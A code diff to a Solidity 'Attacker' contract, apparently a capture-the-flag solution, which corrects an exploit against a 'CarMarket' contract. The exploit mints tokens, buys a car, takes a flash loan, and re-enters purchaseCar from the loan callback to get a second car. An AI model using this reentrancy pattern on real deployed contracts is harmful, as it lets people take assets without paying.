@@ -14,7 +14,11 @@ contract Attacker {
                                  VARIABLES
     --------------------------------------------------------------*/
     ICarToken private carToken;
-    ICarMarket  private carMarket;
+    ICarMarket private carMarket;
+
+    /*------------------------------------------------------------
+                                 FUNCTIONS
+    --------------------------------------------------------------*/
 
     /**
     * @notice Constructor
@@ -30,17 +34,20 @@ contract Attacker {
     */
     function attack() external {
         //mint & approve
-        carToken.approve(address(carMarket), 100001 ether);
         carToken.mint();
+        carToken.approve(address(carMarket), 100001 ether);
+
         //purchase
         carMarket.purchaseCar("black", "Rolls Royce", "Phantom Drophead");
+        
         //flashloan
-        (bool success, bytes memory data) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 100000 ether));
-        //console.log();
-        string memory dataString = string(data);
-        require(success, dataString);
+        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashLoan(uint256)", 100000 ether));
+        require(success, "flashloan failed");
     }
 
+    /**
+    * @notice receivedCarToken - the function to handle the flashLoan
+    */
     function receivedCarToken(address) external {
         carMarket.purchaseCar("black", "Rolls Royce", "Wraith Black Badge");
 
